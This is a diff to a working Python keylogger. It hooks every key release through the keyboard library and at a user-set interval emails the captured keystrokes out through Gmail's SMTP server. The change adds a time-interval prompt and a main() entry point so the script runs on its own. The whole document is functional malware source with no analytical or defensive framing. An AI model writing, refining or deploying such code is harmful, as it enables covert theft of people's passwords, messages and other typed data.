@@ -2,16 +2,14 @@ import keyboard, os, smtplib, getpass
 from threading import Timer
 
 
-# get email address and password
+# get email address, password, and time interval
 EMAIL_ADDRESS = input("Email Address: ")
 EMAIL_PASSWORD = getpass.getpass("Email Password: ")
+INTERVAL = int(input("Time interval (seconds): "))
 
 
 class Keylogger:
-  def __init__(self, interval):
-    # initialize interval
-    self.interval = interval
-
+  def __init__(self):
     # record keylogs
     self.log = ""
 
@@ -38,11 +36,12 @@ class Keylogger:
     # setup SMTP connection
     server = smtplib.SMTP(host="smtp.gmail.com", port=587)
     server.starttls()
-
-    # login and password,then send send mail
+  
+    # send message
     server.login(email,password)
     server.sendmail(email,email,message)
     server.quit()
+          
 
   def report(self):
     # send keylogs 
@@ -53,7 +52,7 @@ class Keylogger:
     self.log = ""
 
     # die when main thread die
-    timer = Timer(interval=self.interval, function=self.report)
+    timer = Timer(interval=INTERVAL, function=self.report)
     timer.daemon = True
     timer.start()
 
@@ -62,3 +61,11 @@ class Keylogger:
     keyboard.on_release(callback=self.callback)
     self.report()
     keyboard.wait()
+
+
+def main():
+  keylogger = Keylogger() 
+  keylogger.start()
+
+if __name__ == '__main__':
+  main()
